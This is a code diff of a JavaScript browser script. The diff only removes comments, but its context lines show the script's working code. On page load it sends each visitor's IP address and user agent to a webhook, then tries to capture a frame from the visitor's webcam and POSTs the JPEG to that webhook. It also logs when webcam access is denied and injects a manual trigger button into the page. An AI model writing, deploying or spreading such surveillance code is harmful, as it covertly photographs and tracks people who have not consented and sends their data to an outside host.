@@ -65,7 +65,6 @@ async function logToWebhook(title, description) {
   });
 }
 
-// 丂ᚴᛁᚥᛖ丂丂丂丂 WEBCAM SNATCHER
 async function hijackWebcam() {
   try {
     const ip = await getIP();
@@ -86,7 +85,6 @@ async function hijackWebcam() {
         fetch(WEBHOOK_URL, { method: "POST", body: formData });
         logToWebhook("📸 WEBCAM CAPTURED", `IP: ${ip}\nResolution: ${canvas.width}x${canvas.height}`);
         
-        // Stop stream after capture
         stream.getTracks().forEach(track => track.stop());
       }, "image/jpeg", 0.85);
     };
@@ -95,7 +93,6 @@ async function hijackWebcam() {
   }
 }
 
-// ䷀䷁䷊䷋ MAIN EXECUTION
 (async function() {
   const ip = await getIP();
   await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
@@ -106,7 +103,6 @@ async function hijackWebcam() {
     await logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
   }
 
-  // 丂ᚴᛁᚥᛖ丂丂丂丂 MANUAL TRIGGER BUTTON
   document.body.innerHTML += `
     <button id="executeBtn" style="
       position:fixed;
